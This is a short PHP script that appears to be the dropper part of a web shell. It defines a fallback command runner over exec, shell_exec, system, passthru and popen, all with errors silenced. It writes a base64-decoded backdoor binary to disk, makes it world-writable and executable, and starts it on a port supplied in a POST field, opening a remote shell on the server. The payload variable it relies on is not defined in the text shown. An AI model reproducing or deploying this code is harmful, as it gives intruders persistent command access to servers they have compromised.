<?php
function cfb($fname,$text)
{
    $w_file=@fopen($fname,"w") or bberr();
    if($w_file)
    {
        @fputs($w_file,@base64_decode($text));
        @fclose($w_file);
    }
}

function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
     if(function_exists('exec'))
     {
        @exec($cfe,$res);
        $res = join("\n",$res);
     }
     elseif(function_exists('shell_exec'))
    {
        $res = @shell_exec($cfe);
    }
    elseif(function_exists('system'))
    {
        @ob_start();
        @system($cfe);
        $res = @ob_get_contents();
        @ob_end_clean();
    }
    elseif(function_exists('passthru'))
    {
        @ob_start();
        @passthru($cfe);
        $res = @ob_get_contents();
        @ob_end_clean();
    }
    elseif(@is_resource($f = @popen($cfe,"r")))
    {
       $res = "";
       while(!@feof($f)) { $res .= @fread($f,1024); }
       @pclose($f);
    }
 }
 return $res;
}


 $ip = gethostbyname($_SERVER["HTTP_HOST"]);
 $por = $_POST['backconnectport'];
 
 cfb("shbd",$backdoor);
 ex("chmod 777 shbd");
 
 $cmd = "./shbd $por";
 exec("$cmd > /dev/null &");
 
 exit;
?>